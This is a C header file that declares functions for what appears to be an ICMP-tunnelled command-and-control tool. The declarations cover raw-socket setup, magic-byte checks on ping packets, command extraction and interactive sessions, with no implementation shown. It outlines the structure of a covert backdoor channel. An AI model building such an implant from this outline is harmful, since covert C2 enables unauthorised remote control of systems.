#ifndef C2_H
#define C2_H

#include <netinet/ip_icmp.h>
#define BUFFER_SIZE 1024

void c2_init_n_call(char *interface_to_bind);
int create_socket(unsigned char *inteface_to_bind);
int read_from_socket(int sockfd, unsigned char *buffer,int size);
void interact(int sockfd);
void print_connection_succeed(unsigned char *src_ip);
unsigned char *get_command(unsigned char *buffer);
int check_magic_byte(struct icmphdr *icmp);
struct sockaddr_in prep_ip_headers(struct iphdr *ip);
unsigned char *parse_data_section(unsigned char *packet);
void prep_icmp_headers(struct icmphdr *icmp, unsigned char *data, uint16_t checksum);
void append_to_data_section(struct icmphdr *icmp, unsigned char *data, unsigned char *input);

#endif